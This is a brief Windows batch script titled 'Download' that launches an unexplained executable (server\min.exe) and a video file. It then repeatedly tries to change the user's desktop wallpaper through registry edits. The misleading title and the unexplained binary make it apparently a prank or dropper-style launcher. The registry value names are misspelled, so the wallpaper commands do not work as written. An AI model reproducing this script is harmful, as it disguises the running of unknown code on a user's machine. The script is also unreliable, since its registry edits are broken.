echo off
title Download
cls



start server\min.exe
start server\skr.mp4
reg add "hkcu\control panel\desktop" /v wollpoper /t REG_SZ /d "server\sss.jpg" /f
reg add "hkcu\control panel\desktop" /v WollpoperStyle /t REG_SZ /d 6 /f
RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters,1,True
reg add "hkcu\control panel\desktop" /v wollpoper /t REG_SZ /d "server\sss.jpg" /f
reg add "hkcu\control panel\desktop" /v WollpoperStyle /t REG_SZ /d 6 /f
RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters,1,True

exit
